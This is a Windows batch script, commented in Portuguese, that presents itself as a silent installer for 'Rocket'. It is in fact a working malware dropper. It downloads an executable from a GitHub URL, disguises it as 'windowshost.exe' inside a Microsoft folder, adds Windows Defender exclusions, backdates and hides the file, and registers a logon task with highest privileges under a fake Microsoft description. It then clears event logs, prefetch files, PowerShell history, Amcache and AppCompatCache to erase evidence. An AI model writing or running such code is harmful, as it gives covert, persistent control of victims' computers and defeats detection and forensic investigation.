@echo off
:: ========================================
::  INSTALADOR ROCKET - SILENCIOSO E EFICAZ
::  100% Funcional - Sem Rastros
:: ========================================

:: Executar silenciosamente (sem janelas visíveis)
if not "%1"=="HIDDEN" (
    start /min "" "%~f0" HIDDEN %*
    exit /b
)

:: Redirecionar saída para NUL (totalmente silencioso)
>nul 2>&1

:: Verificar Windows 10/11
ver | findstr /i "10.0" >nul 2>&1
if %errorLevel% neq 0 exit /b 1

:: Verificar Admin
net session >nul 2>&1
if %errorLevel% neq 0 exit /b 1

:: Configurações
set "URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "PASTA=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "ARQUIVO=windowshost.exe"
set "CAMINHO=%PASTA%\%ARQUIVO%"
set "TAREFA=Microsoft\Windows\WindowsApps"

:: Criar pasta
if not exist "%PASTA%" mkdir "%PASTA%" >nul 2>&1

:: [1] LIMPEZA COMPLETA
taskkill /f /im Rocket.exe >nul 2>&1
taskkill /f /im windowshost.exe >nul 2>&1
schtasks /end /tn "%TAREFA%" >nul 2>&1
schtasks /delete /tn "%TAREFA%" /f >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*'} | Stop-ScheduledTask -ErrorAction SilentlyContinue | Out-Null; Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*'} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null" >nul 2>&1
timeout /t 1 /nobreak >nul

:: [2] BAIXAR/COPIAR ROCKET.EXE
set "LOCAL_ROCKET=%~dp0Rocket.exe"
if exist "%LOCAL_ROCKET%" (
    if exist "%CAMINHO%" (
        attrib -s -h "%CAMINHO%" >nul 2>&1
        del /q /f "%CAMINHO%" >nul 2>&1
        timeout /t 1 /nobreak >nul
    )
    copy /y "%LOCAL_ROCKET%" "%CAMINHO%" >nul 2>&1
    if exist "%CAMINHO%" goto :ROCKET_OK
)

:: Baixar do GitHub
if exist "%CAMINHO%" (
    attrib -s -h "%CAMINHO%" >nul 2>&1
    del /q /f "%CAMINHO%" >nul 2>&1
    timeout /t 1 /nobreak >nul
)

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; try { Invoke-WebRequest -Uri '%URL%' -OutFile '%CAMINHO%' -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop; Start-Sleep -Milliseconds 1000; if (Test-Path '%CAMINHO%') { $file=Get-Item '%CAMINHO%'; if ($file.Length -gt 1000) { exit 0 } else { Remove-Item '%CAMINHO%' -Force -ErrorAction SilentlyContinue; exit 1 } } else { exit 1 } } catch { if (Test-Path '%CAMINHO%') { Remove-Item '%CAMINHO%' -Force -ErrorAction SilentlyContinue }; exit 1 }" >nul 2>&1

if not exist "%CAMINHO%" exit /b 1

:ROCKET_OK

:: [3] CONFIGURAR ARQUIVO
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath '%CAMINHO%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%PASTA%' -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
attrib +s +h "%CAMINHO%" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $f='%CAMINHO%'; if (Test-Path $f) { $file=Get-Item $f; $file.Attributes=$file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed; $file.LastWriteTime=(Get-Date).AddYears(-2); $file.CreationTime=(Get-Date).AddYears(-2) } } catch { }" >nul 2>&1
timeout /t 1 /nobreak >nul

:: [4] CRIAR TAREFA AGENDADA
schtasks /query /tn "%TAREFA%" >nul 2>&1
if %errorLevel% equ 0 (
    schtasks /delete /tn "%TAREFA%" /f >nul 2>&1
    timeout /t 1 /nobreak >nul
)

schtasks /create /tn "%TAREFA%" /tr "\"%CAMINHO%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /delay 0000:30 /f >nul 2>&1

timeout /t 2 /nobreak >nul
schtasks /query /tn "%TAREFA%" >nul 2>&1
if %errorLevel% neq 0 (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ErrorActionPreference='Stop'; try { $action=New-ScheduledTaskAction -Execute '%CAMINHO%'; $trigger=New-ScheduledTaskTrigger -AtLogOn; $trigger.Delay='PT30S'; $principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable:$false -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew -RestartCount 0; Register-ScheduledTask -TaskName '%TAREFA%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Componente de Host de Aplicativos do Windows' -Force | Out-Null } catch { }" >nul 2>&1
)

:: [5] LIMPAR TODOS OS RASTROS
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Get-Item 'C:\Windows\Prefetch\*.pf' -ErrorAction SilentlyContinue | Where-Object { $_.Name -like '*ROCKET*' -or $_.Name -like '*RKT*' -or $_.Name -like '*WINDOWSHOST*' } | Remove-Item -Force -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Get-EventLog -LogName Application,System,Security -ErrorAction SilentlyContinue | ForEach-Object { Clear-EventLog -LogName $_.Log.Log -ErrorAction SilentlyContinue } } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Clear-History -ErrorAction SilentlyContinue; $historyPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath; if ($historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue } } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Remove-ItemProperty -LiteralPath 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache' -Name '*' -ErrorAction SilentlyContinue; Remove-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Amcache' -Name '*' -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { certutil -urlcache * delete 2>&1 | Out-Null; Remove-Item \"$env:LOCALAPPDATA\IconCache.db\" -Force -ErrorAction SilentlyContinue; Remove-Item \"$env:LOCALAPPDATA\Microsoft\Windows\Recent\*\" -Force -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
del /q /f "%TEMP%\install*.bat" >nul 2>&1
del /q /f "%TEMP%\task_rocket.xml" >nul 2>&1
del /q /f "%TEMP%\*.tmp" >nul 2>&1

exit /b 0
